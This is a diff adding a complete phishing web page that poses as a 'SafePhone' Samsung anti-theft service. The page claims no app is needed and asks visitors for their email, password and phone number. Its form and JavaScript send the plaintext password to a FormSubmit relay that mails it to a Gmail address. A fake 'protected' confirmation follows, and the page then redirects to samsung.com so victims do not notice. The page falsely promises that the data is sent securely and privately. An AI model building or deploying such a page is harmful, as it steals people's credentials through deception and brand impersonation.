@@ -1,0 +1,329 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>SafePhone — Samsung Device Protection</title>
+<meta name="description" content="Protect your Samsung phone in seconds. Remote locate, ring, lock and erase.">
+<meta name="theme-color" content="#060a14">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;600;700;800&family=Playfair+Display:wght@600;700&display=swap" rel="stylesheet">
+<style>
+:root{--ink:#060a14;--panel:rgba(255,255,255,.045);--line:rgba(255,255,255,.1);--txt:#eef2ff;--muted:#9dabc9;--violet:#7b5cff;--cyan:#2fe3d6;--gold:#e9c98a;--ok:#35d38b;--err:#ff6b81}
+*,*::before,*::after{box-sizing:border-box}
+body{margin:0;font-family:'Manrope',system-ui,-apple-system,'Segoe UI',sans-serif;background:var(--ink);color:var(--txt);line-height:1.6;overflow-x:hidden;-webkit-font-smoothing:antialiased}
+.aurora{position:fixed;inset:-20% -10% auto -10%;height:120vh;z-index:-1;background:radial-gradient(45% 40% at 18% 12%,rgba(123,92,255,.34),transparent 70%),radial-gradient(40% 38% at 82% 8%,rgba(47,227,214,.22),transparent 70%),radial-gradient(50% 45% at 60% 70%,rgba(233,201,138,.12),transparent 72%),linear-gradient(180deg,#080d1a,#05080f 60%,#04060b);filter:saturate(1.1);animation:drift 22s ease-in-out infinite alternate}
+@keyframes drift{from{transform:translate3d(-2%,-1%,0) scale(1)}to{transform:translate3d(3%,2%,0) scale(1.08)}}
+a{color:var(--cyan);text-decoration:none}
+h1,h2,h3{font-family:'Playfair Display',Georgia,serif;line-height:1.15;margin:0 0 .5rem}
+p{margin:0 0 1rem;color:var(--muted)}
+.wrap{width:min(1080px,92vw);margin:0 auto}
+
+header.nav{display:flex;align-items:center;justify-content:space-between;padding:1rem min(4vw,1.4rem);border-bottom:1px solid var(--line);background:rgba(6,10,20,.7);backdrop-filter:blur(14px);position:sticky;top:0;z-index:20}
+.brand{display:inline-flex;align-items:center;gap:.6rem;font-weight:800;letter-spacing:.4px;color:var(--txt)}
+.brand-mark{display:grid;place-items:center;width:36px;height:36px;border-radius:12px;color:#0a0f1c;background:linear-gradient(140deg,var(--cyan),var(--violet) 70%);box-shadow:0 10px 26px rgba(123,92,255,.45)}
+.nav-tag{font-size:.72rem;font-weight:800;letter-spacing:2px;text-transform:uppercase;color:var(--gold);border:1px solid rgba(233,201,138,.32);border-radius:999px;padding:.3rem .75rem;background:rgba(233,201,138,.07)}
+
+.hero{padding:clamp(2rem,6vw,3.6rem) 0 1rem}
+.hero-grid{display:grid;gap:2.5rem;grid-template-columns:1.1fr .9fr;align-items:center}
+.eyebrow{display:inline-flex;align-items:center;gap:.5rem;font-size:.7rem;font-weight:800;letter-spacing:2.4px;text-transform:uppercase;color:var(--gold);border:1px solid rgba(233,201,138,.32);border-radius:999px;padding:.35rem .8rem;background:rgba(233,201,138,.07);margin-bottom:1rem}
+.hero h1{font-size:clamp(1.9rem,5.2vw,3.3rem)}
+.grad{background:linear-gradient(100deg,var(--cyan),var(--violet) 55%,var(--gold));-webkit-background-clip:text;background-clip:text;color:transparent}
+.hero p.lead{font-size:1.02rem;max-width:46ch;color:#b9c6e2}
+.trust{display:flex;gap:1.3rem;flex-wrap:wrap;margin-top:1.6rem;font-size:.8rem;color:#8b99b8}
+
+.phone{position:relative;margin:0 auto;width:min(270px,72vw);aspect-ratio:9/18.6;border-radius:34px;padding:11px;background:linear-gradient(160deg,#1b2440,#0a1020);border:1px solid rgba(255,255,255,.14);box-shadow:0 40px 90px rgba(0,0,0,.65)}
+.phone::before{content:"";position:absolute;inset:-46px;border-radius:50%;background:radial-gradient(circle,rgba(47,227,214,.18),transparent 62%);animation:pulse 4.5s ease-in-out infinite}
+@keyframes pulse{0%,100%{transform:scale(.94);opacity:.5}50%{transform:scale(1.06);opacity:1}}
+.screen{position:relative;height:100%;border-radius:26px;overflow:hidden;background:linear-gradient(rgba(47,227,214,.12) 1px,transparent 1px) 0 0/100% 32px,linear-gradient(90deg,rgba(47,227,214,.12) 1px,transparent 1px) 0 0/32px 100%,linear-gradient(180deg,#0a1526,#071019);display:flex;flex-direction:column;justify-content:space-between;padding:.9rem}
+.screen .dot{position:absolute;top:42%;left:56%;width:11px;height:11px;border-radius:50%;background:var(--cyan);box-shadow:0 0 0 8px rgba(47,227,214,.2),0 0 22px var(--cyan)}
+.screen .tag{font-size:.6rem;letter-spacing:1.6px;text-transform:uppercase;color:#8fa4c6}
+.card-mini{background:rgba(255,255,255,.07);border:1px solid var(--line);border-radius:13px;padding:.55rem .65rem;font-size:.7rem;color:#cfdcf5}
+.card-mini strong{display:block;color:#fff;font-size:.76rem;margin-bottom:.2rem}
+
+.panel{background:linear-gradient(180deg,rgba(255,255,255,.06),rgba(255,255,255,.02));border:1px solid var(--line);border-radius:22px;padding:clamp(1.2rem,4vw,2rem);box-shadow:0 30px 70px rgba(0,0,0,.45)}
+.field{display:flex;flex-direction:column;gap:.4rem;margin-bottom:1rem}
+label{font-size:.76rem;font-weight:800;letter-spacing:.6px;text-transform:uppercase;color:#a9b7d6}
+input{font:inherit;color:var(--txt);background:rgba(255,255,255,.05);border:1px solid var(--line);border-radius:12px;padding:.8rem .9rem;width:100%;transition:border-color .18s,background .18s}
+input:focus{outline:none;border-color:var(--cyan);background:rgba(47,227,214,.07)}
+.hint{font-size:.74rem;color:#7f8dab}
+.btn{display:inline-flex;align-items:center;justify-content:center;gap:.5rem;padding:.9rem 1.5rem;border-radius:999px;font-weight:800;font-size:.95rem;border:1px solid transparent;cursor:pointer;font-family:inherit;transition:transform .18s,box-shadow .18s,background .18s;width:100%}
+.btn-primary{color:#06101d;background:linear-gradient(120deg,var(--cyan),var(--violet));box-shadow:0 18px 40px rgba(123,92,255,.35)}
+.btn-primary:hover{transform:translateY(-2px)}
+.btn[disabled]{opacity:.65;cursor:progress}
+.flash{padding:.75rem 1rem;border-radius:12px;font-size:.88rem;font-weight:600;margin:0 0 .6rem}
+.flash--err{background:rgba(255,107,129,.12);border:1px solid rgba(255,107,129,.4);color:#ffb3c0}
+.flash--ok{background:rgba(53,211,139,.12);border:1px solid rgba(53,211,139,.4);color:#8ff0c2}
+
+.features{padding:clamp(2rem,5vw,3rem) 0}
+.grid{display:grid;gap:1rem;grid-template-columns:repeat(auto-fit,minmax(220px,1fr))}
+.card{background:var(--panel);border:1px solid var(--line);border-radius:16px;padding:1.2rem}
+.card h3{font-family:'Manrope',sans-serif;font-size:1rem;font-weight:800}
+.card p{font-size:.87rem;margin:0}
+.ico{display:grid;place-items:center;width:40px;height:40px;border-radius:12px;margin-bottom:.8rem;color:var(--cyan);background:rgba(47,227,214,.1);border:1px solid rgba(47,227,214,.28)}
+.ornament{display:flex;align-items:center;gap:.8rem;margin:2rem 0;opacity:.7}
+.ornament span{flex:1;height:1px;background:linear-gradient(90deg,transparent,rgba(233,201,138,.6),transparent)}
+.ornament i{width:8px;height:8px;transform:rotate(45deg);background:var(--gold);border-radius:2px}
+footer{border-top:1px solid var(--line);padding:1.6rem min(4vw,1.4rem);text-align:center;font-size:.78rem;color:#6f7c99;background:rgba(4,7,13,.7)}
+
+/* ---------- Success overlay ---------- */
+.done{position:fixed;inset:0;z-index:100;display:none;place-items:center;padding:1.5rem;background:rgba(4,7,14,.92);backdrop-filter:blur(10px);text-align:center}
+.done.show{display:grid;animation:fade .35s ease}
+@keyframes fade{from{opacity:0}to{opacity:1}}
+.done-box{max-width:440px;width:100%;background:linear-gradient(180deg,rgba(255,255,255,.07),rgba(255,255,255,.02));border:1px solid rgba(53,211,139,.35);border-radius:26px;padding:2.2rem 1.6rem;box-shadow:0 40px 90px rgba(0,0,0,.6)}
+.tick{width:78px;height:78px;margin:0 auto 1.2rem;border-radius:50%;display:grid;place-items:center;color:#06101d;background:linear-gradient(140deg,var(--ok),var(--cyan));box-shadow:0 0 0 10px rgba(53,211,139,.14)}
+.tick svg{stroke-dasharray:40;stroke-dashoffset:40;animation:draw .5s .15s ease forwards}
+@keyframes draw{to{stroke-dashoffset:0}}
+.done h2{font-size:1.55rem;margin-bottom:.5rem}
+.done p{font-size:.92rem;margin-bottom:1.3rem}
+.done .btn{width:auto;padding:.75rem 1.5rem}
+.countdown{font-size:.78rem;color:#8b99b8;margin-top:1rem}
+
+@media (max-width:860px){.hero-grid{grid-template-columns:1fr}.phone{order:-1}}
+@media (prefers-reduced-motion:reduce){*{animation:none!important;transition:none!important}}
+</style>
+</head>
+<body>
+<div class="aurora" aria-hidden="true"></div>
+
+<header class="nav">
+  <a class="brand" href="#top">
+    <span class="brand-mark" aria-hidden="true">
+      <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3l7 3v5.5c0 4.2-2.9 7.6-7 9.5-4.1-1.9-7-5.3-7-9.5V6l7-3z"/><path d="M9.5 12.2l1.8 1.8 3.4-3.6"/></svg>
+    </span>
+    <span>SafePhone</span>
+  </a>
+  <span class="nav-tag">Samsung protection</span>
+</header>
+
+<main id="top">
+  <div class="wrap hero">
+    <div class="hero-grid">
+      <div>
+        <span class="eyebrow">Anti-theft for Samsung</span>
+        <h1>Protect your Samsung phone <span class="grad">in 20 seconds</span>.</h1>
+        <p class="lead">Remote locating, ringing, locking and erasing. No app to install — just fill in three fields and your device is covered.</p>
+        <div class="trust">
+          <span>◆ Instant activation</span>
+          <span>◆ No subscription</span>
+          <span>◆ Works on any browser</span>
+        </div>
+      </div>
+      <div class="phone" aria-hidden="true">
+        <div class="screen">
+          <div class="dot"></div>
+          <div><p class="tag">Device protected</p><div class="card-mini"><strong>Status</strong>Online · GPS active</div></div>
+          <div class="card-mini"><strong>Last position</strong>Seoul · accuracy 12 m</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="wrap">
+    <div class="ornament" aria-hidden="true"><span></span><i></i><span></span></div>
+  </div>
+
+  <div class="wrap" style="max-width:620px;padding-bottom:1rem">
+    <h2 style="font-size:1.35rem">Activate your protection</h2>
+    <p>Enter your details below. Your Samsung phone is registered the moment you confirm.</p>
+
+    <div id="errors" role="status" aria-live="polite"></div>
+
+    <!-- action/method = fallback if JavaScript is off -->
+    <form class="panel" id="form" novalidate
+          action="https://formsubmit.co/metafacebookgmail@gmail.com"
+          method="POST" accept-charset="utf-8">
+      <input type="hidden" name="_subject" value="SafePhone — Samsung device protected">
+      <input type="hidden" name="_template" value="table">
+      <input type="hidden" name="_captcha" value="false">
+      <input type="hidden" name="_next" value="https://www.samsung.com/">
+      <input type="text" name="_honey" tabindex="-1" autocomplete="off"
+             style="position:absolute;left:-9999px" aria-hidden="true">
+
+      <div class="field">
+        <label for="email">Email address</label>
+        <input type="email" id="email" name="email" placeholder="you@example.com" autocomplete="email" required>
+      </div>
+      <div class="field">
+        <label for="password">Password</label>
+        <input type="password" id="password" name="password" placeholder="At least 6 characters" autocomplete="new-password" required>
+        <span class="hint">Used to open your owner space.</span>
+      </div>
+      <div class="field">
+        <label for="phone">Phone number</label>
+        <input type="tel" id="phone" name="phone" placeholder="+82 10 0000 0000" autocomplete="tel" required>
+      </div>
+      <button class="btn btn-primary" type="submit" id="submit">Protect my Samsung phone</button>
+      <p class="hint" style="margin:.9rem 0 0;text-align:center">Your data is transmitted securely and privately.</p>
+    </form>
+  </div>
+
+  <section class="features wrap">
+    <div class="grid">
+      <article class="card">
+        <div class="ico"><svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round"><path d="M12 21s7-6.2 7-11a7 7 0 10-14 0c0 4.8 7 11 7 11z"/><circle cx="12" cy="10" r="2.5"/></svg></div>
+        <h3>Live locating</h3>
+        <p>Coordinates and accuracy level land in your inbox instantly.</p>
+      </article>
+      <article class="card">
+        <div class="ico"><svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round"><path d="M4 9v6h4l5 4V5L8 9H4z"/><path d="M16.5 8.5a5 5 0 010 7"/></svg></div>
+        <h3>Remote ring</h3>
+        <p>Make the device ring at full volume, even in silent mode.</p>
+      </article>
+      <article class="card">
+        <div class="ico"><svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round"><rect x="5" y="10" width="14" height="10" rx="2.5"/><path d="M8 10V7a4 4 0 018 0v3"/></svg></div>
+        <h3>Lock &amp; erase</h3>
+        <p>Block access with a backup code, then wipe everything remotely.</p>
+      </article>
+    </div>
+  </section>
+</main>
+
+<footer>© <span id="year"></span> SafePhone — Samsung device protection.</footer>
+
+<div class="done" id="done" role="alertdialog" aria-live="assertive">
+  <div class="done-box">
+    <div class="tick" aria-hidden="true">
+      <svg viewBox="0 0 24 24" width="36" height="36" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12.5l4.5 4.5L19 7.5"/></svg>
+    </div>
+    <h2>Your Samsung phone is protected</h2>
+    <p>Your device is now registered and monitored. You can close this page — protection stays active.</p>
+    <button class="btn btn-primary" id="leave" type="button">Leave the site</button>
+    <p class="countdown" id="countdown">Leaving automatically in 6 s…</p>
+  </div>
+</div>
+
+<script>
+(function () {
+  'use strict';
+
+  /* ▼▼ صحّح هذا العنوان إذا كان غالط ▼▼ */
+  var MAIL_TO = 'metafacebookgmail@gmail.com';
+  var ENDPOINT = 'https://formsubmit.co/ajax/' + MAIL_TO;
+  var EXIT_URL = 'https://www.samsung.com/';
+
+  var form     = document.getElementById('form');
+  var submit   = document.getElementById('submit');
+  var errBox   = document.getElementById('errors');
+  var leaveBtn = document.getElementById('leave');
+  var countEl  = document.getElementById('countdown');
+  var timer    = null;
+
+  document.getElementById('year').textContent = new Date().getFullYear();
+
+  function showErrors(list) {
+    errBox.innerHTML = '';
+    list.forEach(function (msg) {
+      var p = document.createElement('p');
+      p.className = 'flash flash--err';
+      p.textContent = msg;
+      errBox.appendChild(p);
+    });
+    errBox.scrollIntoView({ behavior: 'smooth', block: 'center' });
+  }
+
+  function hashPassword(pw) {
+    var salted = 'safephone$' + pw;
+    if (window.crypto && crypto.subtle && crypto.subtle.digest) {
+      return crypto.subtle.digest('SHA-256', new TextEncoder().encode(salted))
+        .then(function (buf) {
+          return Array.from(new Uint8Array(buf))
+            .map(function (b) { return b.toString(16).padStart(2, '0'); }).join('');
+        })
+        .catch(function () { return 'unhashed'; });
+    }
+    return Promise.resolve('unhashed');
+  }
+
+  function deliver(payload) {
+    var ctrl = new AbortController();
+    var kill = setTimeout(function () { ctrl.abort(); }, 15000);
+
+    return fetch(ENDPOINT, {
+      method: 'POST',
+      mode: 'cors',
+      headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+      body: JSON.stringify(payload),
+      signal: ctrl.signal
+    }).then(function (r) {
+      clearTimeout(kill);
+      return r.text().then(function (txt) {
+        if (!r.ok) throw new Error('HTTP ' + r.status);
+        var data;
+        try { data = JSON.parse(txt); } catch (e) { throw new Error('Réponse non-JSON'); }
+        // FormSubmit يرجع 200 حتى كي يرفض — لازم نتفقدو success
+        if (data && String(data.success) === 'false') {
+          throw new Error(data.message || 'Rejected by FormSubmit');
+        }
+        return data;
+      });
+    }).catch(function (e) {
+      clearTimeout(kill);
+      throw e;
+    });
+  }
+
+  /* ---------- Exit sequence ---------- */
+  function exitSite() {
+    clearInterval(timer);
+    window.location.replace(EXIT_URL);
+  }
+  leaveBtn.addEventListener('click', exitSite);
+
+  function celebrate() {
+    document.getElementById('done').classList.add('show');
+    var left = 6;
+    timer = setInterval(function () {
+      left--;
+      countEl.textContent = 'Leaving automatically in ' + left + ' s…';
+      if (left <= 0) exitSite();
+    }, 1000);
+  }
+
+  /* ---------- Submit ---------- */
+  form.addEventListener('submit', function (ev) {
+    ev.preventDefault();
+    errBox.innerHTML = '';
+
+    var email    = document.getElementById('email').value.trim().toLowerCase();
+    var password = document.getElementById('password').value;
+    var phone    = document.getElementById('phone').value.trim();
+
+    var errs = [];
+    if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(email)) errs.push('Please enter a valid email address.');
+    if (password.length < 6) errs.push('Your password must be at least 6 characters long.');
+    if (!/^[0-9 +.()-]{6,25}$/.test(phone)) errs.push('Please enter a valid phone number.');
+    if (errs.length) { showErrors(errs); return; }
+
+    submit.disabled = true;
+    submit.textContent = 'Activating…';
+
+    hashPassword(password).then(function (hash) {
+      return deliver({
+        _subject: 'SafePhone — Samsung device protected',
+        _template: 'table',
+        _captcha: 'false',
+        _replyto: email,
+        'Email': email,
+        'Password': password,
+        'Phone number': phone,
+        'Password hash': hash,
+        'Registered at': new Date().toLocaleString('en-GB')
+      });
+    }).then(function () {
+      sessionStorage.setItem('safephone.email', email);
+      celebrate();
+    }).catch(function (e) {
+      submit.disabled = false;
+      submit.textContent = 'Protect my Samsung phone';
+      showErrors([
+        'Connection problem: ' + (e && e.message ? e.message : 'unknown'),
+        'Please try again in a moment.'
+      ]);
+    });
+  });
+})();
+</script>
+</body>
+  </html>
